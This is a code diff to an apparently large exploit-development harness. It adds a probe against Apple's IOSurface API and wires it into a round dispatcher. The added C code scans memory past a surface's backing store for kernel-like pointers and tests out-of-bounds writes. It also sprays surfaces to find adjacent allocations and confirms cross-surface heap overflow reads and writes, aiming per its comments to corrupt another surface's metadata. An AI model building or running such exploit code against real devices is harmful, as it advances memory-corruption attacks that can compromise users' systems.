@@ -16141,6 +16141,285 @@ static void r393_probe(void) {
 }
 
 /*
+ * r405: Deep boundary scan + write test.
+ *
+ * r404 showed no guard page past backing store. Adjacent data contains
+ * another surface's shared data structure fields.
+ *
+ * This probe:
+ *   Phase 1: Read 8192+ bytes past boundary, scan for kernel-like ptrs
+ *   Phase 2: Write past boundary, verify corruption of adjacent data
+ *   Phase 3: Spray 3 surfaces consecutively, check if backing stores
+ *            are adjacent (predictable layout for heap overflow)
+ *   Phase 4: If adjacent, overflow from A into B's metadata, change B's
+ *            sid to redirect B to a chosen surface
+ */
+static volatile int g_r405_crashed = 0;
+static sigjmp_buf g_r405_jmp;
+static void r405_sighandler(int sig) {
+    g_r405_crashed = sig;
+    siglongjmp(g_r405_jmp, 1);
+}
+
+static void r405_probe(void) {
+    rlog("\n=== r405: Deep Boundary Scan + Write Test ===\n\n");
+    fflush(stdout);
+
+    void (*clientRelease)(IOSurfaceRef) = dlsym(RTLD_DEFAULT, "IOSurfaceClientRelease");
+    if (!clientRelease) { rlog("  Missing symbols\n"); return; }
+
+    struct sigaction sa405, old_bus405, old_segv405;
+    memset(&sa405, 0, sizeof(sa405));
+    sa405.sa_handler = r405_sighandler;
+    sa405.sa_flags = 0;
+    sigaction(SIGBUS, &sa405, &old_bus405);
+    sigaction(SIGSEGV, &sa405, &old_segv405);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nW);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nH);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nB);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nR);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nP);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nA);
+
+    /* ---- Phase 1: Deep boundary scan ---- */
+    rlog("  Phase 1: Deep boundary scan for kernel pointers\n");
+
+    IOSurfaceRef surfScan = IOSurfaceCreate(props);
+    uint32_t scanAs = (uint32_t)IOSurfaceGetAllocSize(surfScan);
+    IOSurfaceLock(surfScan, kIOSurfaceLockReadOnly, NULL);
+    void *scanBase = IOSurfaceGetBaseAddress(surfScan);
+    rlog("    Base=%p AllocSize=%u\n", scanBase, scanAs);
+
+    int kernelPtrCount = 0;
+    int oobLimit = 65536;
+
+    g_r405_crashed = 0;
+    if (sigsetjmp(g_r405_jmp, 1) == 0) {
+        uint8_t *bp = (uint8_t*)scanBase;
+        for (int off = scanAs; off < scanAs + oobLimit; off += 8) {
+            uint64_t v = *(uint64_t*)(bp + off);
+            /* Check for kernel-like pointers (0xfffffff0-0xfffffffe range) */
+            uint16_t top16 = (uint16_t)(v >> 48);
+            if (top16 >= 0xfff0 && top16 <= 0xfffe && v != 0xffffffffffffffff) {
+                rlog("    +%5d: 0x%016llx  <KERNEL-LIKE PTR>\n", off, (unsigned long long)v);
+                kernelPtrCount++;
+            }
+            /* Check for integrity check pattern ~(addr + 0x28) */
+            uint64_t maybeAddr = ~v;
+            if (maybeAddr > 0x100000000ULL && maybeAddr < 0x200000000ULL) {
+                rlog("    +%5d: 0x%016llx  <INTEGRITY: ~addr=0x%016llx>\n",
+                    off, (unsigned long long)v, (unsigned long long)maybeAddr);
+                kernelPtrCount++;
+            }
+            /* Check for surface IDs (small values at known offsets) */
+            /* Also flag non-zero interesting data */
+            if (v != 0 && top16 == 0 && v > 0x100000000ULL && v < 0x200000000ULL) {
+                /* Userspace pointer */
+                if (off < scanAs + 1024) {
+                    rlog("    +%5d: 0x%016llx  <UPTR>\n", off, (unsigned long long)v);
+                }
+            }
+        }
+    } else {
+        rlog("    CRASHED at OOB read: sig %d\n", g_r405_crashed);
+    }
+    IOSurfaceUnlock(surfScan, kIOSurfaceLockReadOnly, NULL);
+    rlog("    Kernel-like pointers found: %d\n", kernelPtrCount);
+    fflush(stdout);
+
+    /* ---- Phase 2: Write past boundary ---- */
+    rlog("\n  Phase 2: Write past boundary test\n");
+
+    IOSurfaceRef surfW = IOSurfaceCreate(props);
+    uint32_t wAs = (uint32_t)IOSurfaceGetAllocSize(surfW);
+    IOSurfaceLock(surfW, 0, NULL);
+    void *wBase = IOSurfaceGetBaseAddress(surfW);
+
+    if (wBase) {
+        g_r405_crashed = 0;
+        if (sigsetjmp(g_r405_jmp, 1) == 0) {
+            /* Read first, then write, then verify */
+            uint8_t *bp = (uint8_t*)wBase;
+            uint64_t origVal = *(uint64_t*)(bp + wAs);
+            rlog("    Original value at +%u: 0x%016llx\n", wAs, (unsigned long long)origVal);
+
+            /* Write a marker */
+            *(uint64_t*)(bp + wAs) = 0xDEADCAFEBEEF1234ULL;
+
+            /* Read back */
+            uint64_t readBack = *(uint64_t*)(bp + wAs);
+            rlog("    After write: 0x%016llx\n", (unsigned long long)readBack);
+
+            if (readBack == 0xDEADCAFEBEEF1234ULL) {
+                rlog("    *** OOB WRITE PAST BACKING STORE WORKS ***\n");
+            }
+
+            /* Restore original value */
+            *(uint64_t*)(bp + wAs) = origVal;
+        } else {
+            rlog("    CRASHED writing: sig %d\n", g_r405_crashed);
+        }
+    }
+    IOSurfaceUnlock(surfW, 0, NULL);
+    fflush(stdout);
+
+    /* ---- Phase 3: Adjacent surface spray ---- */
+    rlog("\n  Phase 3: Adjacent surface backing store test\n");
+
+    /* Use small surfaces (1 page each) for tight packing */
+    int sw=4, sh=4, sbpe=4, sbpr=16, spf=0x42475241, sas=4096;
+    CFMutableDictionaryRef sprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef snW = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+    CFNumberRef snH = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+    CFNumberRef snB = CFNumberCreate(NULL, kCFNumberIntType, &sbpe);
+    CFNumberRef snR = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+    CFNumberRef snP = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+    CFNumberRef snA = CFNumberCreate(NULL, kCFNumberIntType, &sas);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceWidth"), snW);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceHeight"), snH);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerElement"), snB);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceBytesPerRow"), snR);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfacePixelFormat"), snP);
+    CFDictionarySetValue(sprops, CFSTR("IOSurfaceAllocSize"), snA);
+
+    /* Spray 20 small surfaces */
+    IOSurfaceRef spray[20];
+    void *bases[20];
+    for (int i = 0; i < 20; i++) {
+        spray[i] = IOSurfaceCreate(sprops);
+        IOSurfaceLock(spray[i], 0, NULL);
+        bases[i] = IOSurfaceGetBaseAddress(spray[i]);
+        /* Write unique marker */
+        if (bases[i]) memset(bases[i], 0x40 + i, 16);
+        IOSurfaceUnlock(spray[i], 0, NULL);
+    }
+
+    /* Check adjacency */
+    rlog("    Backing store addresses:\n");
+    int adjacentPairs = 0;
+    for (int i = 0; i < 20; i++) {
+        rlog("    spray[%2d] sid=%3u base=%p",
+            i, IOSurfaceGetID(spray[i]), bases[i]);
+        if (i > 0 && bases[i] && bases[i-1]) {
+            ptrdiff_t delta = (uint8_t*)bases[i] - (uint8_t*)bases[i-1];
+            rlog("  delta=%ld", (long)delta);
+            uint32_t prevAs = (uint32_t)IOSurfaceGetAllocSize(spray[i-1]);
+            if (delta == (ptrdiff_t)prevAs) {
+                rlog("  ADJACENT!");
+                adjacentPairs++;
+            }
+        }
+        rlog("\n");
+    }
+    rlog("    Adjacent pairs: %d out of 19\n", adjacentPairs);
+    fflush(stdout);
+
+    /* ---- Phase 4: Cross-read between adjacent surfaces ---- */
+    rlog("\n  Phase 4: Cross-read between adjacent surfaces\n");
+
+    /* Find an adjacent pair */
+    int adjA = -1, adjB = -1;
+    for (int i = 0; i < 19; i++) {
+        if (bases[i] && bases[i+1]) {
+            ptrdiff_t delta = (uint8_t*)bases[i+1] - (uint8_t*)bases[i];
+            uint32_t prevAs = (uint32_t)IOSurfaceGetAllocSize(spray[i]);
+            if (delta == (ptrdiff_t)prevAs) {
+                adjA = i; adjB = i + 1;
+                break;
+            }
+        }
+    }
+
+    if (adjA >= 0) {
+        rlog("    Adjacent pair: spray[%d] → spray[%d]\n", adjA, adjB);
+
+        /* Write unique markers */
+        IOSurfaceLock(spray[adjA], 0, NULL);
+        void *baseAdj = IOSurfaceGetBaseAddress(spray[adjA]);
+        if (baseAdj) {
+            memset(baseAdj, 0, IOSurfaceGetAllocSize(spray[adjA]));
+            ((uint8_t*)baseAdj)[0] = 0xAA;
+            ((uint8_t*)baseAdj)[1] = 0xBB;
+        }
+        IOSurfaceUnlock(spray[adjA], 0, NULL);
+
+        IOSurfaceLock(spray[adjB], 0, NULL);
+        void *baseBdj = IOSurfaceGetBaseAddress(spray[adjB]);
+        if (baseBdj) {
+            memset(baseBdj, 0, IOSurfaceGetAllocSize(spray[adjB]));
+            ((uint8_t*)baseBdj)[0] = 0xCC;
+            ((uint8_t*)baseBdj)[1] = 0xDD;
+        }
+        IOSurfaceUnlock(spray[adjB], 0, NULL);
+
+        /* Read from A past its boundary — should see B's data */
+        IOSurfaceLock(spray[adjA], kIOSurfaceLockReadOnly, NULL);
+        baseAdj = IOSurfaceGetBaseAddress(spray[adjA]);
+        if (baseAdj) {
+            uint32_t aAs = (uint32_t)IOSurfaceGetAllocSize(spray[adjA]);
+            g_r405_crashed = 0;
+            if (sigsetjmp(g_r405_jmp, 1) == 0) {
+                uint8_t b0 = ((uint8_t*)baseAdj)[aAs];
+                uint8_t b1 = ((uint8_t*)baseAdj)[aAs + 1];
+                rlog("    A[%u] (B's data): %02x %02x\n", aAs, b0, b1);
+                if (b0 == 0xCC && b1 == 0xDD) {
+                    rlog("    *** CONFIRMED: READ B's BACKING STORE FROM A ***\n");
+                    rlog("    *** ADJACENT SURFACE HEAP OVERFLOW R/W ***\n");
+
+                    /* Write through A to modify B's data */
+                    ((uint8_t*)baseAdj)[aAs + 2] = 0xEE;
+                    ((uint8_t*)baseAdj)[aAs + 3] = 0xFF;
+                }
+            } else {
+                rlog("    CRASHED: sig %d\n", g_r405_crashed);
+            }
+        }
+        IOSurfaceUnlock(spray[adjA], kIOSurfaceLockReadOnly, NULL);
+
+        /* Verify the write on B */
+        IOSurfaceLock(spray[adjB], kIOSurfaceLockReadOnly, NULL);
+        baseBdj = IOSurfaceGetBaseAddress(spray[adjB]);
+        if (baseBdj) {
+            uint8_t b2 = ((uint8_t*)baseBdj)[2];
+            uint8_t b3 = ((uint8_t*)baseBdj)[3];
+            rlog("    B[2..3]: %02x %02x\n", b2, b3);
+            if (b2 == 0xEE && b3 == 0xFF) {
+                rlog("    *** CONFIRMED: WRITE FROM A MODIFIES B's BACKING STORE ***\n");
+                rlog("    *** LINEAR HEAP OVERFLOW: FULL R/W ACROSS SURFACES ***\n");
+            }
+        }
+        IOSurfaceUnlock(spray[adjB], kIOSurfaceLockReadOnly, NULL);
+    } else {
+        rlog("    No adjacent pair found\n");
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    for (int i = 0; i < 20; i++) CFRelease(spray[i]);
+    CFRelease(surfScan);
+    CFRelease(surfW);
+    CFRelease(props);
+    CFRelease(sprops);
+
+    sigaction(SIGBUS, &old_bus405, NULL);
+    sigaction(SIGSEGV, &old_segv405, NULL);
+
+    rlog("\n=== r405 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r404: Bidirectional backing store R/W + heap probing.
  *
  * r403 proved arbitrary surface targeting via fake shared data.
@@ -65246,6 +65525,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 408) {
+            rlog("*** rounds=408: Deep Boundary Scan + Write Test ***\n");
+            rlog("  OOB scan 64KB, write test, adjacent spray, cross-surface overflow.\n\n");
+            fflush(stdout);
+            r405_probe();
+            goto done;
+        }
         if (rounds == 407) {
             rlog("*** rounds=407: Bidirectional R/W + Heap Probing ***\n");
             rlog("  Backing store bidir, boundary probe, property spray, cross-surface.\n\n");
@@ -67687,7 +67973,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
